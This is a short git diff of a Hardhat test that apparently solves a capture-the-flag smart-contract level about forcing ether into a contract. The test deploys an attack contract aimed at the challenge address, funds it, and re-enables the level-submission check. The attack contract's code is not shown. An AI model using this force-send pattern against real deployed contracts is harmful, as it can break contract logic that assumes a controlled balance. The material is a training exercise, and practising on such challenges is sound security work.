@@ -75,18 +75,18 @@ before(async () => {
 
 it("solves the challenge", async () => {
   // Send tx with value to contract
-  let balance = await ethers.provider.getBalance(challenge.address);
-  console.log(`balance: ${JSON.stringify(balance)}`);
+  const forceAttackContract = await forceAttackFactory.deploy(
+    challenge.address
+  );
+  await forceAttackContract.deployed();
   let tx = await eoa.sendTransaction({
-    to: challenge.address,
+    to: forceAttackContract.address,
     value: ethers.utils.parseUnits("0.0000000000001", "ether"),
     gasLimit: 30000000,
   });
   tx.wait(1);
-  balance = await ethers.provider.getBalance(challenge.address);
-  console.log(`balance: ${JSON.stringify(balance)}`);
 });
 
-// after(async () => {
-//   expect(await submitLevel(challenge.address), "level not solved").to.be.true;
-// });
+after(async () => {
+  expect(await submitLevel(challenge.address), "level not solved").to.be.true;
+});
